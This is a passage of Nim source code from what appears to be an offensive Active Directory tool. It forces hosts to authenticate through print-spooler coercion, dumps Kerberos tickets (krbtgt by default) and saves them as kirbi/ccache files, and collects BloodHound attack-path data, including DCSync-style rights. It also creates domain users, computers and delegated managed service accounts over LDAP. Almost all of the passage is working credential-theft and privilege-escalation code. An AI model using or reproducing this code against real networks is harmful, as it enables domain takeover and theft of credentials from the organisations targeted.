      "capabilities": "0x" & probe.adminTree.capabilities.toHex(8),
      "maximal_access": "0x" & probe.adminTree.maximalAccess.toHex(8)
    },
    "ipc_tree": {
      "attempted": probe.ipcTree.attempted,
      "connected": probe.ipcTree.connected,
      "status": "0x" & probe.ipcTree.status.toHex(8),
      "tree_id": probe.ipcTree.treeId,
      "share_type": probe.ipcTree.shareType,
      "share_flags": "0x" & probe.ipcTree.shareFlags.toHex(8),
      "capabilities": "0x" & probe.ipcTree.capabilities.toHex(8),
      "maximal_access": "0x" & probe.ipcTree.maximalAccess.toHex(8)
    },
    "srvsvc_pipe": {
      "attempted": probe.srvsvcPipe.attempted,
      "opened": probe.srvsvcPipe.opened,
      "status": "0x" & probe.srvsvcPipe.status.toHex(8)
    },
    "srvsvc_rpc": {
      "attempted": probe.srvsvcRpc.attempted,
      "bound": probe.srvsvcRpc.bound,
      "packet_type": probe.srvsvcRpc.packetType,
      "call_id": probe.srvsvcRpc.callId,
      "ack_result": probe.srvsvcRpc.ackResult,
      "message": probe.srvsvcRpc.message
    },
    "shares": sharesJson,
    "shares_requested": config.shares,
    "users_requested": config.users,
    "sessions": enumResultJson(probe.sessions, sessionsArr),
    "disks": enumResultJson(probe.disks, disksArr),
    "loggedon_users": enumResultJson(probe.loggedOnUsers, loggedOnArr),
    "domains": domainsArr,
    "domain_users": enumResultJson(probe.domainUsers, usersArr),
    "domain_groups": enumResultJson(probe.domainGroups, groupsArr),
    "password_policy": enumResultJson(probe.passwordPolicy, policyArr),
    "rid_brute": enumResultJson(probe.ridBrute, ridArr),
    "local_admins": localGroupJson(probe.localAdmins),
    "rdp_users": localGroupJson(probe.rdpUsers),
    "dcom_users": localGroupJson(probe.dcomUsers),
    "ps_remote_users": localGroupJson(probe.psRemoteUsers),
    "message": probe.message
  }
  if config.smbCoerce:
    let listener = if config.coerceListener.len > 0: config.coerceListener else: "127.0.0.1"
    let coerceHost = if config.smbCoerceTarget.len > 0: config.smbCoerceTarget else: host
    let remoteTarget =
      config.smbCoerceTarget.len > 0 and
      config.smbCoerceTarget.toLowerAscii() != host.toLowerAscii()
    let coerceResult =
      if remoteTarget:
        let remote = await spoolcoercemod.coerceViaRemoteTask(host, config.port,
          max(config.timeoutMs, 20000), config.username, config.password,
          config.ntlmHash, config.domain, coerceHost, listener,
          if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
          config.ccachePath, config.krb5ConfigPath)
        (ok: remote.success, message: remote.message)
      else:
        await rprnCoerce(host, coerceHost, config.port, max(config.timeoutMs, 5000), credential, listener)
    result["coerce"] = %*{
      "attempted": true,
      "success": coerceResult.ok,
      "target": coerceHost,
      "listener": listener,
      "message": coerceResult.message
    }
    if config.smbCaptureTickets:
      let captureHost =
        if config.smbCaptureHost.len > 0: config.smbCaptureHost
        elif config.coerceListener.len > 0: config.coerceListener
        else: host
      let ticketUser =
        if config.smbTicketUser.len > 0: config.smbTicketUser
        elif config.smbCoerceTarget.len > 0:
          config.smbCoerceTarget.split('.')[0].split('\\')[^1] & "$"
        elif probe.ntlmChallenge.netbiosComputer.len > 0: probe.ntlmChallenge.netbiosComputer & "$"
        else: ""
      let ticketService =
        if config.smbTicketService.len > 0: config.smbTicketService
        else: "krbtgt"
      let captureUser =
        if config.smbCaptureUser.len > 0: config.smbCaptureUser
        else: config.username
      let capturePassword =
        if config.smbCapturePassword.len > 0: config.smbCapturePassword
        else: config.password
      let captureHash =
        if config.smbCaptureHash.len > 0: config.smbCaptureHash
        else: config.ntlmHash
      let captureDomain =
        if config.smbCaptureDomain.len > 0: config.smbCaptureDomain
        else: config.domain
      var onTicketUpdate: ticketdumpmod.TicketDumpUpdate = nil
      if not config.jsonOutput and config.smbRawTicket:
        onTicketUpdate = proc(chunk: string) {.closure, gcsafe.} =
          stdout.write(chunk)
          stdout.flushFile()
      let cap = await ticketdumpmod.dumpTicketsViaTask(captureHost, config.port,
        max(config.timeoutMs, 20000), captureUser, capturePassword,
        captureHash, captureDomain, ticketUser, ticketService,
        max(config.smbCaptureSeconds, 1), max(config.smbCaptureInterval, 1),
        if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        config.ccachePath, config.krb5ConfigPath, onTicketUpdate)
      let capNode = ticketdumpmod.toJson(cap)
      if cap.success and config.smbCaptureOut.len > 0 and cap.tickets.len > 0:
        let outSpec = config.smbCaptureOut
        let kirbiPath =
          if outSpec.toLowerAscii().endsWith(".kirbi"): outSpec
          elif outSpec.toLowerAscii().endsWith(".ccache"): changeFileExt(outSpec, "kirbi")
          else: outSpec & ".kirbi"
        let ccachePath =
          if outSpec.toLowerAscii().endsWith(".ccache"): outSpec
          elif outSpec.toLowerAscii().endsWith(".kirbi"): changeFileExt(outSpec, "ccache")
          else: outSpec & ".ccache"
        try:
          writeFile(kirbiPath, decode(cap.tickets[0].kirbiBase64))
          let imp = tgsmod.kirbiToCcache(kirbiPath, ccachePath)
          capNode["saved_kirbi"] = %kirbiPath
          capNode["saved_ccache"] = %ccachePath
          capNode["ccache_import"] = %*{
            "success": imp.success,
            "principal": imp.principal,
            "ticket_count": imp.ticketCount,
            "message": imp.message
          }
        except CatchableError as error:
          capNode["save_error"] = %error.msg.splitLines()[0]
      result["ticket_capture"] = capNode
  elif config.smbCaptureTickets:
    let captureHost =
      if config.smbCaptureHost.len > 0: config.smbCaptureHost
      else: host
    let ticketUser =
      if config.smbTicketUser.len > 0: config.smbTicketUser
      elif probe.ntlmChallenge.netbiosComputer.len > 0: probe.ntlmChallenge.netbiosComputer & "$"
      else: ""
    let ticketService =
      if config.smbTicketService.len > 0: config.smbTicketService
      else: "krbtgt"
    let captureUser =
      if config.smbCaptureUser.len > 0: config.smbCaptureUser
      else: config.username
    let capturePassword =
      if config.smbCapturePassword.len > 0: config.smbCapturePassword
      else: config.password
    let captureHash =
      if config.smbCaptureHash.len > 0: config.smbCaptureHash
      else: config.ntlmHash
    let captureDomain =
      if config.smbCaptureDomain.len > 0: config.smbCaptureDomain
      else: config.domain
    var onTicketUpdate: ticketdumpmod.TicketDumpUpdate = nil
    if not config.jsonOutput and config.smbRawTicket:
      onTicketUpdate = proc(chunk: string) {.closure, gcsafe.} =
        stdout.write(chunk)
        stdout.flushFile()
    let cap = await ticketdumpmod.dumpTicketsViaTask(captureHost, config.port,
      max(config.timeoutMs, 20000), captureUser, capturePassword,
      captureHash, captureDomain, ticketUser, ticketService,
      max(config.smbCaptureSeconds, 1), max(config.smbCaptureInterval, 1),
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
      config.ccachePath, config.krb5ConfigPath, onTicketUpdate)
    let capNode = ticketdumpmod.toJson(cap)
    if cap.success and config.smbCaptureOut.len > 0 and cap.tickets.len > 0:
      let outSpec = config.smbCaptureOut
      let kirbiPath =
        if outSpec.toLowerAscii().endsWith(".kirbi"): outSpec
        elif outSpec.toLowerAscii().endsWith(".ccache"): changeFileExt(outSpec, "kirbi")
        else: outSpec & ".kirbi"
      let ccachePath =
        if outSpec.toLowerAscii().endsWith(".ccache"): outSpec
        elif outSpec.toLowerAscii().endsWith(".kirbi"): changeFileExt(outSpec, "ccache")
        else: outSpec & ".ccache"
      try:
        writeFile(kirbiPath, decode(cap.tickets[0].kirbiBase64))
        let imp = tgsmod.kirbiToCcache(kirbiPath, ccachePath)
        capNode["saved_kirbi"] = %kirbiPath
        capNode["saved_ccache"] = %ccachePath
        capNode["ccache_import"] = %*{
          "success": imp.success,
          "principal": imp.principal,
          "ticket_count": imp.ticketCount,
          "message": imp.message
        }
      except CatchableError as error:
        capNode["save_error"] = %error.msg.splitLines()[0]
    result["ticket_capture"] = capNode

proc ldapEntryJson(entry: ldapclient.LdapEntry): JsonNode =
  result = %*{"dn": entry.dn}
  var attrs = newJObject()
  var decoded = newJObject()
  proc decodeFiletime(value: string): string =
    try:
      let ft = parseUInt(value)
      if ft == 0 or ft == 9223372036854775807'u64: return ""
      let unixSecs = int64((ft div 10_000_000'u64) - 11_644_473_600'u64)
      utc(fromUnix(unixSecs)).format("yyyy-MM-dd HH:mm:ss") & "Z"
    except CatchableError:
      ""
  proc decodeGeneralized(value: string): string =
    if value.len >= 13 and value.endsWith("Z"):
      value[0 .. 3] & "-" & value[4 .. 5] & "-" & value[6 .. 7] &
        " " & value[8 .. 9] & ":" & value[10 .. 11] & ":" & value[12 .. 13] & "Z"
    else:
      ""
  proc uacFlags(value: string): JsonNode =
    result = newJArray()
    var uac = 0
    try: uac = parseInt(value)
    except CatchableError: return
    for pair in [
      (2, "ACCOUNTDISABLE"), (16, "LOCKOUT"), (32, "PASSWD_NOTREQD"),
      (64, "PASSWD_CANT_CHANGE"), (512, "NORMAL_ACCOUNT"),
      (4096, "WORKSTATION_TRUST_ACCOUNT"), (8192, "SERVER_TRUST_ACCOUNT"),
      (65536, "DONT_EXPIRE_PASSWORD"), (262144, "SMARTCARD_REQUIRED"),
      (524288, "TRUSTED_FOR_DELEGATION"), (1048576, "NOT_DELEGATED"),
      (4194304, "DONT_REQ_PREAUTH"), (8388608, "PASSWORD_EXPIRED"),
      (16777216, "TRUSTED_TO_AUTH_FOR_DELEGATION")
    ]:
      if (uac and pair[0]) != 0: result.add %pair[1]
  for k, vs in entry.attrs:
    var arr = newJArray()
    var decArr = newJArray()
    for v in vs:
      var allPrintable = true
      for c in v:
        let o = ord(c)
        if o < 9 or (o > 13 and o < 32):
          allPrintable = false
          break
      if allPrintable: arr.add %v
      else: arr.add %("base64:" & v.toHex())
      let kl = k.toLowerAscii()
      if kl in ["lastlogon", "lastlogontimestamp", "pwdlastset", "accountexpires",
          "badpasswordtime", "lockouttime", "ms-mcs-admpwdexpirationtime",
          "mslaps-passwordexpirationtime"]:
        let iso = decodeFiletime(v)
        if iso.len > 0: decArr.add %iso
      elif kl in ["whenchanged", "whencreated"]:
        let iso = decodeGeneralized(v)
        if iso.len > 0: decArr.add %iso
      elif kl == "useraccountcontrol":
        decArr.add uacFlags(v)
    attrs[k] = arr
    if decArr.len > 0:
      decoded[k] = decArr
  result["attrs"] = attrs
  if decoded.len > 0:
    result["decoded"] = decoded

proc sidFromRaw(raw: string): string =
  if raw.len < 8: return ""
  let revision = ord(raw[0])
  let subCount = ord(raw[1])
  var authority: uint64 = 0
  for i in 0 ..< 6:
    authority = (authority shl 8) or uint64(ord(raw[2 + i]))
  result = "S-" & $revision & "-" & $authority
  for i in 0 ..< subCount:
    let offset = 8 + i * 4
    if offset + 4 > raw.len: break
    var v: uint32 = 0
    for j in 0 ..< 4:
      v = v or (uint32(ord(raw[offset + j])) shl (j * 8))
    result.add "-" & $v

proc firstAttr(entry: ldapclient.LdapEntry; name: string): string =
  if name in entry.attrs and entry.attrs[name].len > 0:
    entry.attrs[name][0]
  else:
    ""

proc attrVals(entry: ldapclient.LdapEntry; name: string): seq[string] =
  if name in entry.attrs:
    entry.attrs[name]
  else:
    @[]

proc attrsArray(entry: ldapclient.LdapEntry; name: string): JsonNode =
  result = newJArray()
  if name in entry.attrs:
    for value in entry.attrs[name]:
      result.add %value

proc certificateInventoryEntryJson(entry: ldapclient.LdapEntry): JsonNode =
  result = ldapEntryJson(entry)
  let account =
    if firstAttr(entry, "sAMAccountName").len > 0: firstAttr(entry, "sAMAccountName")
    elif firstAttr(entry, "dNSHostName").len > 0: firstAttr(entry, "dNSHostName")
    elif firstAttr(entry, "userPrincipalName").len > 0: firstAttr(entry, "userPrincipalName")
    elif firstAttr(entry, "displayName").len > 0: firstAttr(entry, "displayName")
    else: entry.dn
  let certCount = attrVals(entry, "userCertificate").len
  let altSecIds = attrVals(entry, "altSecurityIdentities")
  let keyCredCount = attrVals(entry, "msDS-KeyCredentialLink").len
  var methods = newJArray()
  if certCount > 0: methods.add %"userCertificate"
  if altSecIds.len > 0: methods.add %"altSecurityIdentities"
  if keyCredCount > 0: methods.add %"msDS-KeyCredentialLink"
  result["account"] = %account
  result["certificate_count"] = %certCount
  result["alt_security_identities"] = attrsArray(entry, "altSecurityIdentities")
  result["key_credential_count"] = %keyCredCount
  result["mapping_methods"] = methods

proc bloodhoundObjectId(entry: ldapclient.LdapEntry; fallback: string): string =
  if "objectSid" in entry.attrs and entry.attrs["objectSid"].len > 0:
    result = sidFromRaw(entry.attrs["objectSid"][0])
  if result.len == 0:
    result = fallback

proc bloodhoundCollectedEmpty(): JsonNode =
  result = %*{"Results": [], "Collected": false}
  result["FailureReason"] = newJNull()

proc dnKey(dn: string): string =
  dn.strip().toLowerAscii()

proc bloodhoundAceRightNames(ace: ldapclient.LdapAce): seq[string] =
  if ace.aceType notin [0, 5]:
    return
  let objectType = ace.objectType.toLowerAscii()
  if "GenericAll" in ace.rights:
    result.add "GenericAll"
  if "GenericWrite" in ace.rights:
    result.add "GenericWrite"
  if "WriteDACL" in ace.rights:
    result.add "WriteDacl"
  if "WriteOwner" in ace.rights:
    result.add "WriteOwner"
  if "ControlAccess" in ace.rights:
    case objectType
    of "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2":
      result.add "GetChanges"
    of "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2":
      result.add "GetChangesAll"
    of "89e95b76-444d-4c62-991a-0facbeda640c":
      result.add "GetChangesInFilteredSet"
    of "00299570-246d-11d0-a768-00aa006e0529":
      result.add "ForceChangePassword"
    else:
      result.add "ExtendedRight"
  if "WriteProperty" in ace.rights:
    case objectType
    of "bf9679c0-0de6-11d0-a285-00aa003049e2":
      result.add "AddMember"
    of "f3a64788-5306-11d1-a9c5-0000f80367c1":
      result.add "WriteSPN"
    of "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79":
      result.add "AddAllowedToAct"
    else:
      result.add "WriteProperty"
  if "Self" in ace.rights:
    result.add "AddSelf"

proc bloodhoundAces(r: ldapclient.LdapAclResult;
                    principalTypes: Table[string, string]): JsonNode =
  result = newJArray()
  for ace in r.aces:
    let sid = ace.trusteeSid
    if sid.len == 0:
      continue
    let ptype =
      if sid in principalTypes: principalTypes[sid]
      elif sid.startsWith("S-1-5-21-"): "Base"
      else: "Unknown"
    for right in bloodhoundAceRightNames(ace):
      result.add %*{
        "PrincipalSID": sid,
        "PrincipalType": ptype,
        "RightName": right,
        "IsInherited": (ace.aceFlags and 0x10) != 0,
        "InheritanceHash": "",
        "IsPermissionForOwnerRightsSid": false,
        "IsInheritedPermissionForOwnerRightsSid": false
      }

proc bloodhoundNode(entry: ldapclient.LdapEntry; kind, domainName: string;
                    acesByDn: Table[string, JsonNode]): JsonNode =
  let name =
    if firstAttr(entry, "sAMAccountName").len > 0: firstAttr(entry, "sAMAccountName")
    elif firstAttr(entry, "dNSHostName").len > 0: firstAttr(entry, "dNSHostName")
    elif firstAttr(entry, "displayName").len > 0: firstAttr(entry, "displayName")
    elif firstAttr(entry, "cn").len > 0: firstAttr(entry, "cn")
    else: entry.dn
  let oid = bloodhoundObjectId(entry, entry.dn)
  var props = %*{
    "name": name.toUpperAscii(),
    "domain": domainName.toUpperAscii(),
    "distinguishedname": entry.dn,
    "description": firstAttr(entry, "description"),
    "enabled": firstAttr(entry, "userAccountControl") != "514"
  }
  if firstAttr(entry, "displayName").len > 0:
    props["displayname"] = %firstAttr(entry, "displayName")
  if firstAttr(entry, "dNSHostName").len > 0:
    props["dnshostname"] = %firstAttr(entry, "dNSHostName")
  if firstAttr(entry, "operatingSystem").len > 0:
    props["operatingsystem"] = %firstAttr(entry, "operatingSystem")
  result = %*{
    "ObjectIdentifier": oid,
    "Properties": props,
    "Aces": if dnKey(entry.dn) in acesByDn: acesByDn[dnKey(entry.dn)] else: newJArray(),
    "IsDeleted": false,
    "IsACLProtected": false
  }
  case kind
  of "users":
    result["AllowedToDelegate"] = newJArray()
    result["SPNTargets"] = attrsArray(entry, "servicePrincipalName")
    result["HasSIDHistory"] = newJArray()
  of "groups":
    result["Members"] = attrsArray(entry, "member")
  of "computers":
    result["AllowedToDelegate"] = attrsArray(entry, "servicePrincipalName")
    result["AllowedToAct"] = newJArray()
    result["HasSIDHistory"] = newJArray()
    result["Sessions"] = bloodhoundCollectedEmpty()
    result["LocalAdmins"] = bloodhoundCollectedEmpty()
    result["RemoteDesktopUsers"] = bloodhoundCollectedEmpty()
    result["DcomUsers"] = bloodhoundCollectedEmpty()
    result["PSRemoteUsers"] = bloodhoundCollectedEmpty()
    result["PrivilegedSessions"] = bloodhoundCollectedEmpty()
    result["RegistrySessions"] = bloodhoundCollectedEmpty()
  of "gpos":
    result["Links"] = newJArray()
  else:
    discard

proc bloodhoundTrustNode(entry: ldapclient.LdapEntry; domainName: string): JsonNode =
  let partner =
    if firstAttr(entry, "trustPartner").len > 0: firstAttr(entry, "trustPartner")
    elif firstAttr(entry, "flatName").len > 0: firstAttr(entry, "flatName")
    elif firstAttr(entry, "cn").len > 0: firstAttr(entry, "cn")
    else: entry.dn
  var oid = ""
  if "securityIdentifier" in entry.attrs and entry.attrs["securityIdentifier"].len > 0:
    oid = sidFromRaw(entry.attrs["securityIdentifier"][0])
  if oid.len == 0:
    oid = partner.toUpperAscii()
  result = %*{
    "ObjectIdentifier": oid,
    "Properties": {
      "name": partner.toUpperAscii(),
      "domain": domainName.toUpperAscii(),
      "distinguishedname": entry.dn,
      "trustpartner": firstAttr(entry, "trustPartner"),
      "flatname": firstAttr(entry, "flatName"),
      "trustdirection": firstAttr(entry, "trustDirection"),
      "trusttype": firstAttr(entry, "trustType"),
      "trustattributes": firstAttr(entry, "trustAttributes")
    },
    "IsDeleted": false
  }

proc bloodhoundFileJson(kind: string; data: JsonNode): JsonNode =
  %*{"data": data, "meta": {"methods": 0, "type": kind, "count": data.len, "version": 6}}

proc validateBloodhoundFileJson(path, expectedKind: string; doc: JsonNode): JsonNode =
  var errors = newJArray()
  proc addError(message: string) =
    errors.add %message
  if doc.kind != JObject:
    addError("top-level JSON is not an object")
  elif not doc.hasKey("data") or doc["data"].kind != JArray:
    addError("missing data array")
  elif not doc.hasKey("meta") or doc["meta"].kind != JObject:
    addError("missing meta object")
  else:
    let meta = doc["meta"]
    if not meta.hasKey("methods") or meta["methods"].kind notin {JInt, JFloat}:
      addError("meta.methods is missing or non-numeric")
    if not meta.hasKey("type") or meta["type"].getStr() != expectedKind:
      addError("meta.type does not match " & expectedKind)
    if not meta.hasKey("count") or meta["count"].kind != JInt:
      addError("meta.count is missing or non-integer")
    elif meta["count"].getInt() != doc["data"].len:
      addError("meta.count does not match data length")
    if not meta.hasKey("version") or meta["version"].kind != JInt:
      addError("meta.version is missing or non-integer")
    elif meta["version"].getInt() <= 0:
      addError("meta.version must be positive")
    for i in 0 ..< doc["data"].len:
      let item = doc["data"][i]
      if item.kind != JObject:
        addError("data[" & $i & "] is not an object")
        continue
      if not item.hasKey("ObjectIdentifier") or item["ObjectIdentifier"].getStr().len == 0:
        addError("data[" & $i & "] missing ObjectIdentifier")
      if not item.hasKey("Properties") or item["Properties"].kind != JObject:
        addError("data[" & $i & "] missing Properties object")
      elif not item["Properties"].hasKey("name") or
          item["Properties"]["name"].getStr().len == 0:
        addError("data[" & $i & "] missing Properties.name")
  result = %*{"file": path, "type": expectedKind, "valid": errors.len == 0,
    "errors": errors}

proc writeBloodhoundFiles(outPath, domainName, baseDn, domainSid, funcLevel: string;
                          users, groups, computers, trusts, gpos: seq[ldapclient.LdapEntry];
                          acesByDn: Table[string, JsonNode]): JsonNode =
  var root = outPath
  let wantZip = outPath.toLowerAscii().endsWith(".zip")
  if wantZip:
    root = getTempDir() / ("nimux-bh-" & $getCurrentProcessId())
  createDir(root)
  let domainUpper = domainName.toUpperAscii()
  var domains = newJArray()
  domains.add %*{
    "ObjectIdentifier": domainSid,
    "Properties": {
      "name": domainUpper,
      "domain": domainUpper,
      "distinguishedname": baseDn,
      "functionallevel": funcLevel
    },
    "Aces": if dnKey(baseDn) in acesByDn: acesByDn[dnKey(baseDn)] else: newJArray(),
    "Links": [],
    "ChildObjects": [],
    "Trusts": []
  }
  var usersData = newJArray()
  for entry in users: usersData.add bloodhoundNode(entry, "users", domainName, acesByDn)
  var groupsData = newJArray()
  for entry in groups: groupsData.add bloodhoundNode(entry, "groups", domainName, acesByDn)
  var computersData = newJArray()
  for entry in computers: computersData.add bloodhoundNode(entry, "computers", domainName, acesByDn)
  var gposData = newJArray()
  for entry in gpos: gposData.add bloodhoundNode(entry, "gpos", domainName, acesByDn)
  var trustsData = newJArray()
  for entry in trusts: trustsData.add bloodhoundTrustNode(entry, domainName)

  let files = [
    ("domains.json", bloodhoundFileJson("domains", domains)),
    ("users.json", bloodhoundFileJson("users", usersData)),
    ("groups.json", bloodhoundFileJson("groups", groupsData)),
    ("computers.json", bloodhoundFileJson("computers", computersData)),
    ("gpos.json", bloodhoundFileJson("gpos", gposData)),
    ("trusts.json", bloodhoundFileJson("trusts", trustsData))
  ]
  var written = newJArray()
  var validation = newJArray()
  for item in files:
    let path = root / item[0]
    writeFile(path, pretty(item[1]))
    written.add %path
    validation.add validateBloodhoundFileJson(path, item[1]["meta"]["type"].getStr(), item[1])
  var valid = true
  for item in validation:
    if not item["valid"].getBool():
      valid = false
      break
  result = %*{"path": root, "files": written, "zipped": false,
    "validation": validation, "valid": valid}
  if wantZip:
    let cmd = "cd " & quoteShell(root) & " && zip -q -j " & quoteShell(outPath) & " *.json"
    let zipped = execCmdEx(cmd)
    result["zip"] = %outPath
    result["zipped"] = %(zipped.exitCode == 0)
    if zipped.exitCode != 0:
      result["zip_error"] = %zipped.output

proc bloodhoundPrincipalTypes(domainSid: string;
                              users, groups, computers: seq[ldapclient.LdapEntry]):
                              Table[string, string] =
  if domainSid.len > 0:
    result[domainSid] = "Domain"
  for entry in users:
    let sid = bloodhoundObjectId(entry, "")
    if sid.len > 0: result[sid] = "User"
  for entry in groups:
    let sid = bloodhoundObjectId(entry, "")
    if sid.len > 0: result[sid] = "Group"
  for entry in computers:
    let sid = bloodhoundObjectId(entry, "")
    if sid.len > 0: result[sid] = "Computer"

proc collectBloodhoundAclMap(host: string; config: CliConfig; baseDn, domainSid: string;
                             users, groups, computers, gpos: seq[ldapclient.LdapEntry]):
                             Future[Table[string, JsonNode]] {.async.} =
  let principalTypes = bloodhoundPrincipalTypes(domainSid, users, groups, computers)
  var targets: seq[string]
  if baseDn.len > 0:
    targets.add baseDn
  for entry in users:
    if entry.dn.len > 0: targets.add entry.dn
  for entry in groups:
    if entry.dn.len > 0: targets.add entry.dn
  for entry in computers:
    if entry.dn.len > 0: targets.add entry.dn
  for entry in gpos:
    if entry.dn.len > 0: targets.add entry.dn
  var seen: Table[string, bool]
  for target in targets:
    let key = dnKey(target)
    if key.len == 0 or key in seen:
      continue
    seen[key] = true
    let acl = await ldapclient.aclForObject(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      target, kerberos=config.kerberos)
    if acl.success:
      result[key] = bloodhoundAces(acl, principalTypes)

proc randomComputerPassword(): string =
  const Alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#%^*-_=+"
  var rng = initRand(int(getTime().toUnixFloat() * 1e9))
  for _ in 0 ..< 20:
    result.add Alphabet[rng.rand(Alphabet.len - 1)]

proc cliBaseDn(domain: string): string =
  if domain.toLowerAscii().contains("dc="):
    return domain
  for part in domain.split('.'):
    let clean = part.strip()
    if clean.len > 0:
      if result.len > 0: result.add ","
      result.add "DC=" & clean

proc baseDnToDnsName(baseDn: string): string =
  for piece in baseDn.split(','):
    let clean = piece.strip()
    if clean.len >= 3 and clean[0..2].toLowerAscii() == "dc=":
      if result.len > 0: result.add "."
      result.add clean[3 .. ^1]

proc currentKerberosPrincipal(): tuple[user, domain: string] =
  let principal =
    if getEnv("KRB5CCNAME").len > 0:
      pkinitmod.currentCachePrincipal(getEnv("KRB5CCNAME"))
    else:
      pkinitmod.currentCachePrincipal()
  let at = principal.find('@')
  if at > 0:
    result.user = principal[0 ..< at]
    result.domain = principal[at + 1 .. ^1]
  else:
    result.user = principal

proc resolveWriteBaseDn(host: string; config: CliConfig): Future[string] {.async.} =
  let domain = config.domain.strip()
  if domain.toLowerAscii().contains("dc=") or domain.contains('.'):
    return cliBaseDn(domain)
  let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true, limit: 1),
    kerberos=config.kerberos)
  if probe.defaultNamingContext.len > 0:
    return probe.defaultNamingContext
  return cliBaseDn(domain)

proc resolveConfigDn(host: string; config: CliConfig): Future[string] {.async.} =
  let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true, limit: 1),
    kerberos=config.kerberos)
  if probe.configurationNamingContext.len > 0:
    return probe.configurationNamingContext
  let baseDn = await resolveWriteBaseDn(host, config)
  return "CN=Configuration," & baseDn

proc splitAttrValue(text: string): tuple[attr, value: string] =
  let pos = text.find('=')
  if pos < 1:
    raise newException(ValueError, "attribute assignment expects attr=value: " & text)
  (text[0 ..< pos].strip(), text[pos + 1 .. ^1])

proc attrsFromAssignments(items: seq[string]): seq[tuple[name: string, values: seq[string]]] =
  for item in items:
    let av = splitAttrValue(item)
    var found = false
    for entry in result.mitems:
      if entry.name.toLowerAscii() == av.attr.toLowerAscii():
        entry.values.add av.value
        found = true
        break
    if not found:
      result.add (name: av.attr, values: @[av.value])

proc modsFromAssignments(items: seq[string]; op: ldapclient.LdapModOp): seq[ldapclient.LdapModification] =
  for item in items:
    let av = splitAttrValue(item)
    result.add ldapclient.LdapModification(op: op, attr: av.attr, values: @[av.value])

proc computerPartsCli(name: string): tuple[cn, sam: string] =
  var clean = name.strip()
  while clean.endsWith("$"):
    clean.setLen(clean.len - 1)
  (clean, clean & "$")

proc buildCreateAction(config: CliConfig; baseDn, dnsDomain: string): ldapclient.LdapWriteAction =
  let name = config.ldapName
  if name.len == 0:
    raise newException(ValueError, "--create requires --name")
  case config.ldapCreateKind
  of "user":
    let dn = if config.ldapAddDn.len > 0: config.ldapAddDn else: "CN=" & name & ",CN=Users," & baseDn
    var attrs: seq[tuple[name: string, values: seq[string]]]
    attrs.add (name: "objectClass", values: @["top", "person", "organizationalPerson", "user"])
    attrs.add (name: "cn", values: @[name])
    attrs.add (name: "distinguishedName", values: @[dn])
    attrs.add (name: "sAMAccountName", values: @[name])
    let securePasswordWrite = config.useSsl or config.port in [636, 3269]
    if securePasswordWrite and config.ldapNewPass.len > 0:
      attrs.add (name: "userAccountControl", values: @["512"])
      attrs.add (name: "unicodePwd", values: @[ldapclient.encodeAdPassword(config.ldapNewPass)])
    else:
      attrs.add (name: "userAccountControl", values: @["514"])
    result = ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: attrs)
  of "computer":
    let parts = computerPartsCli(name)
    let dn = if config.ldapAddDn.len > 0: config.ldapAddDn else: "CN=" & parts.cn & ",CN=Computers," & baseDn
    let dnsName = if config.computerDnsHost.len > 0: config.computerDnsHost elif dnsDomain.len > 0: parts.cn & "." & dnsDomain else: ""
    let securePasswordWrite = config.useSsl or config.port in [636, 3269]
    var attrs: seq[tuple[name: string, values: seq[string]]]
    attrs.add (name: "objectClass", values: @["top", "person", "organizationalPerson", "user", "computer"])
    attrs.add (name: "cn", values: @[parts.cn])
    attrs.add (name: "sAMAccountName", values: @[parts.sam])
    attrs.add (name: "userAccountControl", values: @[if securePasswordWrite: "4096" else: "4128"])
    let computerPass = if config.ldapNewPass.len > 0: config.ldapNewPass else: config.computerPassword
    if securePasswordWrite and computerPass.len > 0:
      attrs.add (name: "unicodePwd", values: @[ldapclient.encodeAdPassword(computerPass)])
    if dnsName.len > 0:
      attrs.add (name: "dNSHostName", values: @[dnsName])
      attrs.add (name: "servicePrincipalName", values: @["HOST/" & parts.cn, "HOST/" & dnsName])
    result = ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: attrs)
  of "group":
    let dn = if config.ldapAddDn.len > 0: config.ldapAddDn else: "CN=" & name & ",CN=Users," & baseDn
    result = ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: @[
      (name: "objectClass", values: @["top", "group"]),
      (name: "cn", values: @[name]),
      (name: "sAMAccountName", values: @[name]),
      (name: "groupType", values: @["-2147483646"])
    ])
  of "dmsa":
    let parts = computerPartsCli(name)
    let ouDn =
      if config.ldapAddDn.len > 0: config.ldapAddDn
      elif config.computerOu.len > 0: config.computerOu
      else: "CN=Computers," & baseDn
    let dn = "CN=" & parts.cn & "," & ouDn
    var attrs: seq[tuple[name: string, values: seq[string]]]
    attrs.add (name: "objectClass", values: @["msDS-DelegatedManagedServiceAccount"])
    attrs.add (name: "cn", values: @[parts.cn])
    attrs.add (name: "sAMAccountName", values: @[parts.sam])
    attrs.add (name: "dNSHostName", values: @[parts.cn & "." & dnsDomain])
    attrs.add (name: "userAccountControl", values: @["4096"])
    attrs.add (name: "msDS-ManagedPasswordInterval", values: @["30"])
    attrs.add (name: "msDS-SupportedEncryptionTypes", values: @["28"])
    attrs.add (name: "msDS-DelegatedMSAState", values: @["2"])
    let dmsaGroupMsaMembership =
      "\x01\x00\x04\x80\x2c\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00" &
      "\x02\x00\x18\x00\x01\x00\x00\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05" &
      "\x0b\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00" &
      "\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00"
